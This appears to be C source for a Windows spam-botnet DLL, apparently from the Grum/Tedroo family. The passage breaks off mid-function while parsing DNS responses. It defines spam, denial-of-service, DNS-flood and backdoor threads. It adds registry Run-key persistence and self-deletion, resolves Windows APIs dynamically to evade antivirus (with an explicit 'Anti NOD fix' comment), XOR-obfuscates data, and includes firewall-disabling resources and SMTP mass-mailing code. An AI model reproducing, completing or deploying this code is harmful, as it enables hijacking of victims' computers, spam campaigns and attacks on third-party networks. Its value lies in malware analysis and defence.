#define _CRT_SECURE_NO_DEPRECATE

//#pragma comment(linker,"/entry:Main")
#pragma comment(linker,"/entry:DllMain")

#define printf DbgPrint

#pragma warning(disable:4995)

#include <winsock2.h>
#include <wininet.h>
#include <windns.h>
#include <windows.h>
#include <psapi.h>
#include <shlwapi.h>
#include <ws2tcpip.h>
#include "ntdll.h"

unsigned int __stdcall LifeSupportThread(LPVOID tParam);
unsigned int __stdcall SpamSupportThread(LPVOID tParam);
unsigned int __stdcall DoS1Thread(LPVOID tParam);
unsigned int __stdcall DnsResolverThread(LPVOID tParam);

HANDLE hLifeSupportThread, hSpamSupportThread, hDoS1Thread, hDNSDoSThread, hBackdoorThread;
HANDLE hInitExe;

char cUniqueId[17];

char cMalwareShortName[] = "userini";
char CURRENT_VERSION[] = "447";
char cConfigServer[17] = "grum.com";//"91.207.5.254";
char cReserveConfigPort[6] = "90";
bool bUseReserveConfigPort = false;
char cScriptPage[MAX_PATH] = "/page.php";

char cDotExe[] = ".exe";
//char cDotDll[] = ".dll";
char cRNRN[] = "\r\n\r\n";
char cRN[] = "\r\n";
char cRNdotRN[] = "\r\n.\r\n";
char cDelKeyName[] = "remove";
char cSystemRoot[] = "\\\\?\\globalroot\\systemroot\\system32";
char cSoftMicrWinCVwinlogon[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer";
char cSoftMicrWinCVrun_1[] = "Software\\Microsoft\\Windows\\CurrentVersion\\run";
//char cSoftMicrWinCVrun_1[] = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";
char cSoftMicrWinCVrun_2[] = "Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\Run";
char bMozillaBrowser[] = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)";
char cPointComma[] = ";";
char cDoS[MAX_PATH] = "";
char cDNSDoS[MAX_PATH] = "";

char cQuit[] = "QUIT\r\n";
char cData[] = "DATA\r\n";
char cRset[] = "RSET\r\n";

#include "resources/func_dnsquery_a.h"
#include "resources/func_dnsrecordlistfree.h"

#include "resources/func_firewall1.h"
#include "resources/func_firewall2.h"
#include "resources/func_createprocess.h"
#include "resources/func_createthread.h"
#include "resources/func_regcreatekey.h"
#include "resources/func_regclosekey.h"
#include "resources/func_regqueryvalueex.h"
#include "resources/func_regsetvalueex.h"
#include "resources/func_gettickcount.h"
#include "resources/func_terminatethread.h"
#include "resources/func_exitthread.h"
#include "resources/str_EnableFirewall.h"
#include "resources/str_FirewallDisableNotify.h"
#include "resources/str_SoftMicrSecCent.h"

#include "resources/func_wsastartup.h"
#include "resources/func_wsacleanup.h"
#include "resources/func_recv.h"
#include "resources/func_send.h"
#include "resources/func_bind.h"
#include "resources/func_listen.h"
#include "resources/func_closesocket.h"
#include "resources/func_connect.h"
#include "resources/func_accept.h"
#include "resources/func_shutdown.h"
#include "resources/func_socket.h"
#include "resources/func_select.h"
#include "resources/func_gethostbyname.h"
#include "resources/func_inet_addr.h"
#include "resources/func_setsockopt.h"
#include "resources/func_sendto.h"
#include "resources/func_htons.h"
#include "resources/func_ioctlsocket.h"
#include "resources/func_gethostname.h"
#include "resources/func_ntohs.h"
#include "resources/func_wsagetlasterror.h"

//#include "resources/beep.sys.h"

#define MAX_PACKET_SIZE 100000

typedef HMODULE (WINAPI *hLoadLibraryFunc)(LPCTSTR lpFileName);
typedef BOOL (WINAPI *hCreateProcessFunc)(LPCTSTR lpApplicationName,LPTSTR lpCommandLine,LPSECURITY_ATTRIBUTES lpProcessAttributes,LPSECURITY_ATTRIBUTES lpThreadAttributes,BOOL bInheritHandles,DWORD dwCreationFlags,LPVOID lpEnvironment,LPCTSTR lpCurrentDirectory,LPSTARTUPINFO lpStartupInfo,LPPROCESS_INFORMATION lpProcessInformation);
typedef HANDLE (WINAPI *hCreateThreadFunc)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
typedef LONG (WINAPI *hRegCreateKeyFunc)(HKEY hKey, LPCTSTR lpSubKey, PHKEY phkResult);
typedef LONG (WINAPI *hRegCloseKeyFunc)(HKEY hKey);
typedef LONG (WINAPI *hRegSetValueExFunc)(HKEY hKey, LPCTSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
typedef LONG (WINAPI *hRegQueryValueExFunc)(HKEY hKey, LPCTSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
typedef DWORD (WINAPI *hGetTickCountFunc)(void);
typedef BOOL (WINAPI *hTerminateThreadFunc)(HANDLE hThread, DWORD dwExitCode);
typedef VOID (WINAPI *hExitThreadFunc)(DWORD dwExitCode);
typedef BOOL (WINAPI *hSystemTimeToFileTimeFunc)(const SYSTEMTIME *lpSystemTime, LPFILETIME lpFileTime);
typedef BOOL (WINAPI *hDeleteFileFunc)(LPCTSTR lpFileName);

typedef int (WSAAPI *hWSAStartupFunc)(WORD wVersionRequested, LPWSADATA lpWSAData);
typedef int (WSAAPI *hWSACleanupFunc)(void);
typedef int (WSAAPI *hRecvFunc)(SOCKET s, char* buf, int len, int flags);
typedef int (WSAAPI *hSendFunc)(SOCKET s, const char* buf, int len, int flags);
typedef int (WSAAPI *hBindFunc)(SOCKET s, const struct sockaddr* name, int namelen);
typedef int (WSAAPI *hListenFunc)(SOCKET s, int backlog);
typedef int (WSAAPI *hClosesocketFunc)(SOCKET s);
typedef int (WSAAPI *hConnectFunc)(SOCKET s, const struct sockaddr* name, int namelen);
typedef int (WSAAPI *hAcceptFunc)(SOCKET s, struct sockaddr* addr, int* addrlen);
typedef int (WSAAPI *hShutdownFunc)(SOCKET s, int how);
typedef SOCKET (WSAAPI *hSocketFunc)(int af, int type, int protocol);
typedef int (WSAAPI *hSelectFunc)(int nfds, fd_set* readfds, fd_set* writefds, fd_set* exceptfds, const struct timeval* timeout);
typedef struct hostent* (WSAAPI *hGethostbynameFunc)(const char* name);
typedef unsigned long (WSAAPI *hInet_addrFunc)(const char* cp);
typedef int (WSAAPI *hSetsockoptFunc)(SOCKET s, int level, int optname, const char *optval, int optlen);
typedef int (WSAAPI *hSendtoFunc)(SOCKET s, const char *buf, int len, int flags, const struct sockaddr *to, int tolen);
typedef u_short (WSAAPI *hHtonsFunc)(u_short hostshort);
typedef int (WSAAPI *hIoctlsocketFunc)(SOCKET s, long cmd, u_long *argp);
typedef int (WSAAPI *hGethostnameFunc)(char *name, int namelen);
typedef u_short (WSAAPI *hNtohsFunc)(u_short netshort);
typedef int (WSAAPI *hWSAGetLastErrorFunc)(void);

typedef DNS_STATUS (WINAPI *hDnsQuery_AFunc)(IN PCSTR pszName, IN WORD wType, IN DWORD Options, IN PIP4_ARRAY aipServers OPTIONAL, IN OUT PDNS_RECORD *ppQueryResults OPTIONAL, IN OUT PVOID *pReserved OPTIONAL);
typedef void (WINAPI *hDnsRecordListFreeFunc)(PDNS_RECORD pRecordList, DNS_FREE_TYPE FreeType);
typedef BOOL (WINAPI *hInternetReadFileFunc)(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
typedef HINTERNET (WINAPI *hInternetOpenFunc)(LPCTSTR lpszAgent, DWORD dwAccessType, LPCTSTR lpszProxyName, LPCTSTR lpszProxyBypass, DWORD dwFlags);
typedef HINTERNET (WINAPI *hInternetConnectFunc)(HINTERNET hInternet, LPCTSTR lpszServerName, INTERNET_PORT nServerPort, LPCTSTR lpszUsername, LPCTSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext);
typedef HINTERNET (WINAPI *hHttpOpenRequestFunc)(HINTERNET hConnect, LPCTSTR lpszVerb, LPCTSTR lpszObjectName, LPCTSTR lpszVersion, LPCTSTR lpszReferer, LPCTSTR *lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext);
typedef BOOL (WINAPI *hHttpSendRequestFunc)(HINTERNET hRequest, LPCTSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength);
typedef BOOL (WINAPI *hHttpQueryInfoFunc)(HINTERNET hRequest, DWORD dwInfoLevel, LPVOID lpvBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex);
typedef BOOL (WINAPI *hInternetCloseHandleFunc)(HINTERNET hInternet);
typedef BOOL (WINAPI *hInternetQueryOptionFunc)(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, LPDWORD lpdwBufferLength);


HINSTANCE hKernel32, hAdvapi32, hWs2_32, hDnsapi, hWinInet;
hLoadLibraryFunc hLoadLibrary					= 0;
hCreateProcessFunc hCreateProcess				= 0;
hCreateThreadFunc hCreateThread					= 0;
hRegCreateKeyFunc hRegCreateKey					= 0;
hRegSetValueExFunc hRegSetValueEx				= 0;
hRegQueryValueExFunc hRegQueryValueEx			= 0;
hRegCloseKeyFunc hRegCloseKey					= 0;
hGetTickCountFunc hGetTickCount					= 0;
hTerminateThreadFunc hTerminateThread			= 0;
hExitThreadFunc hExitThread						= 0;
hSystemTimeToFileTimeFunc hSystemTimeToFileTime	= 0;
hDeleteFileFunc hDeleteFile						= 0;
//HANDLE hMutex;

hWSAStartupFunc hWSAStartup						= 0;
hWSACleanupFunc hWSACleanup						= 0;
hRecvFunc hRecv									= 0;
hSendFunc hSend									= 0;
hSocketFunc hSocket								= 0;
hListenFunc hListen								= 0;
hBindFunc hBind									= 0;
hClosesocketFunc hClosesocket					= 0;
hConnectFunc hConnect							= 0;
hAcceptFunc hAccept								= 0;
hShutdownFunc hShutdown							= 0;
hSelectFunc hSelect								= 0;
hInet_addrFunc hInet_addr						= 0;
hGethostbynameFunc hGethostbyname				= 0;
hSetsockoptFunc hSetsockopt						= 0;
hSendtoFunc hSendto								= 0;
hHtonsFunc hHtons								= 0;
hIoctlsocketFunc hIoctlsocket					= 0;
hGethostnameFunc hGethostname					= 0;
hNtohsFunc hNtohs								= 0;
hWSAGetLastErrorFunc hWSAGetLastError			= 0;

hDnsQuery_AFunc hDnsQuery_A						= 0;
hDnsRecordListFreeFunc hDnsRecordListFree		= 0;
hInternetReadFileFunc hInternetReadFile			= 0;
hInternetOpenFunc hInternetOpen					= 0;
hInternetConnectFunc hInternetConnect			= 0;
hHttpOpenRequestFunc hHttpOpenRequest			= 0;
hHttpSendRequestFunc hHttpSendRequest			= 0;
hHttpQueryInfoFunc hHttpQueryInfo				= 0;
hInternetCloseHandleFunc hInternetCloseHandle	= 0;
hInternetQueryOptionFunc hInternetQueryOption	= 0;

bool bDeployed = false;
char cDeployedName[MAX_PATH] = "";

char cGetRequestStart[] = "GET http://";
char cGetRequestEnd[] = " HTTP/1.0\r\n\r\n";
char cSMTP_FORMAT_BOUNDARY[] = "----=_NextPart_%03d_%04X_%08.8lX.%08.8lX";
char cSMTP_FORMAT_MID[] = "%04x%08.8lx$%08.8lx$%08x@%s";
char cContentTypeAlternative[] = "alternative";
PCHAR pcDays[]={"Sun","Mon","Tue","Wed","Thu","Fri","Sat"};
PCHAR pcMonths[]={"XXX","Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"};
#define SMTP_BOUNDARY_SIZE (sizeof(cSMTP_FORMAT_BOUNDARY)+10)

// SMTP Thread data definition
typedef struct SmtpThreadData_struct {
	char * cMessageTemplate;
	char * cMailTo;
	char * cMailFrom;
	DWORD * pdwThreadStatus;
	char * cFormattedMessage;
	char * cReplcaeBuffer;
	DWORD dwThreadIndex;
} SMTP_THREAD_DATA, *PSMTP_THREAD_DATA;
//------------------------------

DWORD dwIp1, dwIp2, dwIp3, dwIp4;
#define THREAD_STATUS_FREE 0
#define THREAD_STATUS_WORKING 1
#define THREAD_STATUS_DONE 2
#ifdef _DEBUG
#define MAX_THREADS 100
#else
#define MAX_THREADS 100
#endif
DWORD dwThreadStatus[MAX_THREADS];
char * cThreadFormattedMessage[MAX_THREADS];
char * cThreadReplaceBuffer[MAX_THREADS];
char * cMXServers;
unsigned char cMXConnected[MAX_THREADS] = {0};
HANDLE hThread[MAX_THREADS];
DWORD dwThreadStartTime[MAX_THREADS];
#ifdef _DEBUG
#define SMTP_THREAD_TIMEOUT 60000
#else
#define SMTP_THREAD_TIMEOUT 60000
#endif
SMTP_THREAD_DATA SmtpThreadData[MAX_THREADS];

bool bSMTPOk = true;
DWORD dwTimeout = 300000;
DWORD dwBackdoorPort = 0;

//------------------------------
// Job definition
#define MAX_EMAILS 1000
typedef struct Job_struct {
	DWORD dwTaskId;
	DWORD dwTextLength;
	char cRealIp[MAX_PATH];
	char cRealHostname[MAX_PATH];
	LPVOID cText;
	DWORD dwStyle; // 0 - Old, 1 - daoprint2
} JOB, *PJOB;
JOB Job;
DWORD dwWaitJob = 60000;

#define MAX_MAIL_LISTS 2
typedef struct mail_list {
	DWORD dwEmailCount;
	char * cEmail[MAX_EMAILS];
} MAIL_LIST, *PMAIL_LIST;

MAIL_LIST MailLists[MAX_MAIL_LISTS];
//------------------------------

DWORD g_dwBoundary;
DWORD g_dwRndSeed;
DWORD g_dwLocalIP;

TIME_ZONE_INFORMATION tziZone;

#define ERRORS_COUNT 25
DWORD dwError[ERRORS_COUNT] = {0};
DWORD dwNoErrors = 0;
DWORD dwUnexpectedErrors = 0;

//char LogFileName[] = "_log.txt";
//bool bLogData;

#define WIN32_LEAN_AND_MEAN
#include <iphlpapi.h>
#include <wab.h>

//char alternative_dns[16] = "209.20.130.33";
char alternative_dns[16] = "77.220.232.44";

#define mx_alloc(n) ((void*)HeapAlloc(GetProcessHeap(), 0, (n)))
#define mx_free(p) {HeapFree(GetProcessHeap(), 0, (p));}

#define TYPE_MX 15
#define CLASS_IN 1

#pragma pack(push, 1)

struct mxlist_t {
	struct mxlist_t *next;
	int pref;
	char mx[256];
};

struct dnsreq_t {
	WORD id;
	WORD flags;
	WORD qncount;
	WORD ancount;
	WORD nscount;
	WORD arcount;
};
#pragma pack(pop)

struct mx_rrlist_t {
	struct mx_rrlist_t *next;
	char domain[260];
	WORD rr_type;
	WORD rr_class;
	WORD rdlen;
	int rdata_offs;
};


//general_routine
void Wait(DWORD dwMSec)
{
	DWORD dwStop, dwStart = (*hGetTickCount)();
	int a,b;
	do
	{
		a = (*hGetTickCount)();
		b = (1 / a) + 1;
		dwStop = a / b;
		Sleep(10);
	} while ((dwStop - dwStart) < dwMSec);
}

DWORD SaveBufToFile(char * FileName, char * Buf, DWORD dwBufSize, bool bAppend)
{
	DWORD dwWritten;
	if ((!bAppend) && (hDeleteFile != 0))
		(*hDeleteFile)(FileName);
	HANDLE hFile = CreateFile(FileName, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_ARCHIVE, NULL);
	SetFilePointer(hFile, 0, NULL, FILE_END);
	WriteFile(hFile, Buf, dwBufSize, &dwWritten, NULL);
	CloseHandle(hFile);
	return dwWritten;
}
/*
void AddToLog(char * cMsg)
{
	if (bLogData)
		SaveBufToFile(LogFileName, cMsg, (int)strlen(cMsg), true);
}

void AddToLogDword(DWORD dwMsg)
{
	if (bLogData)
	{
		char cDword[MAX_PATH];
		itoa(dwMsg, cDword, 10);
		strcat(cDword, "\n");
		SaveBufToFile(LogFileName, cDword, (int)strlen(cDword), true);
	}
}

void LogMemory(char * cMsg)
{
	char cText[MAX_PATH];
	PROCESS_MEMORY_COUNTERS pmc;
	GetProcessMemoryInfo(GetCurrentProcess(), &pmc, sizeof(pmc));
	sprintf(cText, "%s: %lu\n", cMsg, pmc.WorkingSetSize); 
	//AddToLog(cText);
}
*/
int AvailableThread()
{
	for (int iThread = 0; iThread < MAX_THREADS; iThread++)
		if ((dwThreadStatus[iThread] == THREAD_STATUS_FREE) && (hThread[iThread] == NULL))
			return iThread;
	return -1;
}

int BusyThread()
{
	for (int iThread = 0; iThread < MAX_THREADS; iThread++)
		if (dwThreadStatus[iThread] == THREAD_STATUS_WORKING)
			return iThread;
	return -1;
}

void MarkHangThreads()
{
	DWORD dwNowTickCount = (*hGetTickCount)();
	for (int iThread = 0; iThread < MAX_THREADS; iThread++)
		if (dwNowTickCount - dwThreadStartTime[iThread] > SMTP_THREAD_TIMEOUT) {
//			//AddToLog("Marking hanged thread!\n");
			dwThreadStatus[iThread] = THREAD_STATUS_DONE;
		}
}

void FreeThreads(bool bImmediate)
{
	for (int iThread = 0; iThread < MAX_THREADS; iThread++)
	{
		if ((dwThreadStatus[iThread] == THREAD_STATUS_DONE) || (bImmediate))
		{
			if ((*hTerminateThread)(hThread[iThread], 0)) {
				Sleep(100);
				CloseHandle(hThread[iThread]);
			}
			dwThreadStatus[iThread] = THREAD_STATUS_FREE;
			hThread[iThread] = NULL;
		} else if ((dwThreadStatus[iThread] == THREAD_STATUS_FREE) && (hThread[iThread] != NULL)) {
			hThread[iThread] = NULL;
		}
	}
}

DWORD GetModuleFileNameMy(char * cBuf, DWORD dwBufSize)
{
	GetModuleFileName(NULL, cBuf, MAX_PATH);

//	ConvertUNCToNormal(cBuf, MAX_PATH);
	return (DWORD)strlen(cBuf);
}

void AddRegistryValueStr(HKEY hKey, char * cPath, char * cRegistryName, char * cRegistryValue)
{
	int res = (*hRegCreateKey)(hKey, cPath, &hKey);
	if (ERROR_SUCCESS  == res) {
		res = (*hRegSetValueEx)(hKey, cRegistryName, 0, REG_SZ, (LPBYTE)cRegistryValue, (DWORD)strlen(cRegistryValue));
		(*hRegCloseKey)(hKey);
	}
}

void AddRegistryValueInt(HKEY hKey, char * cPath, char * cRegistryName, DWORD dwRegistryValue)
{
	//AddToLog("Writing to ");
	//AddToLog(cPath);
	//AddToLog("\n");
	int res = (*hRegCreateKey)(hKey, cPath, &hKey);
	if (ERROR_SUCCESS  == res) {
		res = (*hRegSetValueEx)(hKey, cRegistryName, 0, REG_DWORD, (LPBYTE)&dwRegistryValue, (DWORD)sizeof(dwRegistryValue));
		(*hRegCloseKey)(hKey);
	}
}

void ReadRegistryValue(HKEY hKey, char * cPath, char * cRegistryName, char * cRegistryValue, DWORD dwValueSize)
{
	//AddToLog("Reading at ");
	//AddToLog(cPath);
	//AddToLog("\n");
	LONG lSize = dwValueSize;
	int res = (*hRegCreateKey)(hKey, cPath, &hKey);
	if (ERROR_SUCCESS  == res) {
		DWORD dwType = REG_SZ;
		(*hRegQueryValueEx)(hKey, cRegistryName, NULL, &dwType, (LPBYTE)cRegistryValue, &dwValueSize);
		(*hRegCloseKey)(hKey);
	}
}

void ExecuteProcess(char * cFileName, bool Terminate)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	si.dwX = RtlRandom(&g_dwRndSeed); // Anti NOD fix "Win32/SpamTool.Tedroo.AB"
	si.dwY = RtlRandom(&g_dwRndSeed); // Anti NOD fix "Win32/SpamTool.Tedroo.AB"
	ZeroMemory(&pi, sizeof(pi));

	//char cModuleName[MAX_PATH];
	//sprintf(cModuleName, "%s%s", cMalwareShortName, cDotDll);

	if (true == Terminate) {
//		ReleaseMutex(hMutex);
		CloseHandle(hInitExe);

		FreeThreads(true);

		char cSourceFile[MAX_PATH];
		GetModuleFileNameMy(cSourceFile, sizeof(cSourceFile));
		AddRegistryValueStr(HKEY_CURRENT_USER, cSoftMicrWinCVwinlogon, cDelKeyName, cSourceFile);
	}
	bool bProcCreated = (*hCreateProcess)(cFileName, NULL, NULL, NULL, true, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

	if (bProcCreated && Terminate) {
		//AddToLog("ExitProcess(3)\n");
		//HMODULE hIam = GetModuleHandle(cModuleName);
		//FreeLibraryAndExitThread(hIam, 3);
		//(*hExitThread)(3);
		TerminateProcess(GetCurrentProcess(), 3);
	}
}

//void ExecuteBat(char * Buf, bool Terminate, char * cBatName)
//{
//	char cDefaultFileName[] = "file.bat";
//	char * cFileName;
//	DWORD dwWritten;
//	HANDLE hFile;
//
//	if ((cBatName == NULL) || (strlen(cBatName) == 0))
//		cFileName = cDefaultFileName;
//	else
//		cFileName = cBatName;
//
//	hFile= CreateFile(cFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_ARCHIVE, NULL);
//	WriteFile(hFile, Buf, (DWORD)strlen(Buf), &dwWritten, NULL);
//	CloseHandle(hFile);
//
//	//AddToLog("Executing bat file\n");
//
//	ExecuteProcess(cFileName, Terminate);
//
//	return;
//}

void Unxor_XorIt(PCHAR pcData, DWORD dwSize, bool bFast)
{
	DWORD dwCh, dwLoop;

	for(dwCh = 0; dwCh < dwSize; dwCh++)
	{
		pcData[dwCh]^=dwCh + 'T';
	}

	if (!bFast)
	{
		dwLoop = 0;
		while (dwLoop < MAXDWORD / 300)
		{
			char cRnd = RtlRandom(&g_dwRndSeed)%256;
			pcData[dwSize - 1] = pcData[dwSize - 1] ^ cRnd;
			pcData[dwSize - 1] = pcData[dwSize - 1] ^ cRnd;
			dwLoop++;
		}
	}
	return;
}

void Unxor_Xorer(PCHAR pcData, DWORD dwDataSize, PCHAR pcKey, DWORD dwKeySize)
{
	DWORD dwCh = 0, dwK = 0;

	while (dwCh < dwDataSize) {
		pcData[dwCh] = pcData[dwCh] ^ pcKey[dwK];
		dwCh++;
		dwK++;
		if (dwK >= dwKeySize) dwK = 0;
	}
	return;
}

DWORD GetAppShortName(char * cBuf, DWORD dwBufSize)
{
	strcpy(cBuf, cMalwareShortName);
	strcat(cBuf, cDotExe);
	return (DWORD)strlen(cBuf);
}

bool ExtractData(char * cSource, char * cDivider, char * cDestination, DWORD dwSizeOfDestination)
{
	DWORD dwDividerPos;
	if ((cSource == NULL) || (cDivider == NULL) || (cDestination == NULL) || (dwSizeOfDestination == 0))
		return false;

	dwDividerPos = (DWORD)(strstr(cSource, cDivider) - cSource);
	if (dwDividerPos > dwSizeOfDestination)
	{
		return false;
	}
	strncpy(cDestination, cSource, dwDividerPos);
	cDestination[dwDividerPos] = '\0';
	return true;
}

int isIP(char *str) {
	for (int i=0; i < strlen(str); i++)
		if ((str[i] >= '0' && str[i] <= '9') || (str[i] == '.'))
			;
	else
		return 0;
	return 1;
}

bool ReplaceStringUsingBuf(char * cInput, char * cFindStr, char * cReplaceStr, char * cTmpBuf)
{
	bool result = false;
	if ((cInput != NULL) && (cFindStr != NULL) & (cReplaceStr != NULL))
	{
		char * cFindStrPos = strstr(cInput, cFindStr);
		if (cFindStrPos != NULL)
		{
			strncpy(cTmpBuf, cInput, cFindStrPos - cInput);
			strncpy(cTmpBuf + (cFindStrPos - cInput), cReplaceStr, strlen(cReplaceStr));
			strncpy(cTmpBuf + (cFindStrPos - cInput + strlen(cReplaceStr)), cFindStrPos + strlen(cFindStr), strlen(cFindStrPos) - strlen(cFindStr));
			cTmpBuf[strlen(cInput) - strlen(cFindStr) + strlen(cReplaceStr)] = '\0';

			strcpy(cInput, cTmpBuf);
			result = true;
		}
	}
	return result;
}

void ParseIp(char * cIp)
{
	if (cIp == NULL)
		return;
	char cTmp[MAX_PATH];
	char * cPoint;

	cPoint = strstr(cIp, ".");
	if (cPoint == NULL)
		return;
	memset(cTmp, '\0', sizeof(cTmp));
	strncpy(cTmp, cIp, cPoint - cIp);
	dwIp1 = atoi(cTmp);

	cIp = cPoint + 1;
	cPoint = strstr(cIp, ".");
	if (cPoint == NULL)
		return;
	memset(cTmp, '\0', sizeof(cTmp));
	strncpy(cTmp, cIp, cPoint - cIp);
	dwIp2 = atoi(cTmp);

	cIp = cPoint + 1;
	cPoint = strstr(cIp, ".");
	if (cPoint == NULL)
		return;
	memset(cTmp, '\0', sizeof(cTmp));
	strncpy(cTmp, cIp, cPoint - cIp);
	dwIp3 = atoi(cTmp);

	cIp = cPoint + 1;
	dwIp4 = atoi(cIp);

	return;
}

void LoadRegistrySettings()
{
	//AddToLog("Loading registry settings.\n");
	cUniqueId[0] = '\0';

	ReadRegistryValue(HKEY_CURRENT_USER, cSoftMicrWinCVwinlogon, "id", cUniqueId, sizeof(cUniqueId));

	if (0 == strlen(cUniqueId)) {
		IP_ADAPTER_INFO AdapterInfo[16];       // Allocate information
											   // for up to 16 NICs
		DWORD dwBufLen = sizeof(AdapterInfo);  // Save memory size of buffer
		DWORD dwStatus = GetAdaptersInfo(      // Call GetAdapterInfo
			AdapterInfo,                 // [out] buffer to receive data
			&dwBufLen);                  // [in] size of receive data buffer

		PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo; // Contains pointer to
		memset(cUniqueId, '\0', sizeof(cUniqueId));
		strncpy(cUniqueId, (PCHAR)((DWORD)(pAdapterInfo->AdapterName) + 1), 8);										   // current adapter info
		strncpy(cUniqueId + 8, (PCHAR)((DWORD)(pAdapterInfo->AdapterName) + 25), 4);										   // current adapter info

		AddRegistryValueStr(HKEY_CURRENT_USER, cSoftMicrWinCVwinlogon, "id", cUniqueId);
	}
}

void Hex2Char(char const* szHex, unsigned char& rch)
{
	rch = 0;
	for(int i=0; i<2; i++)
	{
		if(*(szHex + i) >='0' && *(szHex + i) <= '9')
			rch = (rch << 4) + (*(szHex + i) - '0');
		else if(*(szHex + i) >='A' && *(szHex + i) <= 'F')
			rch = (rch << 4) + (*(szHex + i) - 'A' + 10);
		else
			break;
	}
}    

char *decrypturl(char *str, char *key)
{
	DWORD len = (DWORD)strlen(str) / 2;
	unsigned char ch;
	int i, j = 0;
	for (i = 0; i < (int)len; i++) {
		Hex2Char(str + 2 * i, ch);
		str[i] = ch ^ key[j] + 32;
		j++;
		if (j == strlen(key))
			j=0;
	}
	str[i] = 0;
	return str;
}

DWORD Encode(char * cInput, char * cOutput)
{
	cOutput[0] = '\0';
	int i = 0;
	while (cInput[i] != '\0')
	{
		char cTmpDest[MAX_PATH];
		_itoa((int)cInput[i], cTmpDest, 16);
		if (cTmpDest[1] == '\0')
		{
			cTmpDest[2] = '\0';
			cTmpDest[1] = cTmpDest[0];
			cTmpDest[0] = '0';
		}
		strncpy(cOutput + i * 2, cTmpDest, 2);
		i++;
	}
	cOutput[i * 2] = '\0';
	return i * 2;
}
//general routine end

//mx_list
static int mx_dns2qname(const char *domain, char *buf)
{
	int i, p, t;
	for (i=0,p=0;;) {
		if (domain[i] == 0) break;
		for (t=i; domain[t] && (domain[t] != '.'); t++);
		buf[p++] = (t - i);
		while (i < t) buf[p++] = domain[i++];
		if (domain[i] == '.') i++;
	}
	buf[p++] = '\0';
	return p;
}

static int mx_make_query(SOCKET sock, struct sockaddr_in *dns_addr, const char *domain, WORD req_flags)
{
	char buf[1024];
	int i, tmp;

	memset(buf, 0, sizeof(buf));
	i = 0;
	*(WORD *)(buf+i) = (WORD)((*hGetTickCount)() & 0xFFFF); i += 2;
	*(WORD *)(buf+i) = req_flags; i += 2;		//
	*(WORD *)(buf+i) = (*hHtons)(0x0001); i += 2;	//
	*(WORD *)(buf+i) = 0; i += 2;
	*(WORD *)(buf+i) = 0; i += 2;
	*(WORD *)(buf+i) = 0; i += 2;

	tmp = mx_dns2qname(domain, buf+i); i += tmp;
	*(WORD *)(buf+i) = (*hHtons)(TYPE_MX); i += 2;
	*(WORD *)(buf+i) = (*hHtons)(CLASS_IN); i += 2;

	tmp = (*hSendto)(sock, buf, i, 0, (struct sockaddr *)dns_addr, sizeof(struct sockaddr_in));
	return (tmp <= 0) ? 1 : 0;
}


static int mx_skipqn(char *buf, int pos, int len, struct dnsreq_t *reply_hdr)
{
	int i, n;
	for (i=0; (i<(*hNtohs)(reply_hdr->qncount)) && (pos < len);) {
		n = buf[pos];
		if (n == 0) {
			pos += 5;
			i++;
		} else if (n < 64) {
			pos += 1+n;
		} else {
			pos += 6;
			i++;
		}
	}
	return pos;
}

static int mx_decode_domain(char *buf, int pos, int len, char *out)
{
	int retpos=0, sw, n, j, out_pos;
	*out = 0;

	for (sw=0, out_pos=0; pos < len;) {
		if (out_pos >= 255)
			break;
		n = (unsigned char)buf[pos];
		if (n == 0) {
			pos++;
			break;
		} else if (n < 64) {
			pos++;	
			for (j=0; j<n; j++)
				out[out_pos++] = buf[pos++];
			out[out_pos++] = '.';
		} else {
			if (sw == 0) retpos=pos+2;
			sw = 1;
			n = (*hNtohs)(*(WORD *)(buf+pos)) & 0x3FFF;
			pos = n;
			if (pos >= len) break;
		}
	}

	while (out_pos > 0)
		if (out[out_pos-1] != '.') break; else out_pos--;
	out[out_pos] = 0;

	return (sw == 0) ? pos : retpos;
}

static void mx_free_rrlist(struct mx_rrlist_t *p)
{
	struct mx_rrlist_t *q;
	while (p != NULL) {
		q = p->next;
		mx_free(p);
		p = q;
	}
}


static struct mx_rrlist_t *mx_parse_rr( char *buf, int reply_len)
{
	struct mx_rrlist_t *root, *top, *newrr, tmp_rr;
	struct dnsreq_t *reply_hdr;
	int i, j, rr, rr_count;

	root = top = NULL;
	reply_hdr = (struct dnsreq_t *)buf;

	if (reply_len < 12) return NULL;
	i = 12;
	i = mx_skipqn(buf, i, reply_len, reply_hdr);

	if (i >= reply_len)
		return NULL;

	rr_count = reply_hdr->ancount + reply_hdr->nscount + reply_hdr->arcount;
	for (rr=0,newrr=NULL; (rr < rr_count) && (i < reply_len); rr++) {
		memset(&tmp_rr, '\0', sizeof(struct mx_rrlist_t));
		i = mx_decode_domain(buf, i, reply_len, tmp_rr.domain);
		if ((i+10) >= reply_len) break;
		tmp_rr.rr_type = (*hNtohs)(*(WORD*)(buf+i)); i += 2;
		tmp_rr.rr_class = (*hNtohs)(*(WORD*)(buf+i)); i += 2;
		i += 4;		// 32-bit TTL
		tmp_rr.rdlen = (*hNtohs)(*(WORD*)(buf+i)); i += 2;
		tmp_rr.rdata_offs = i;
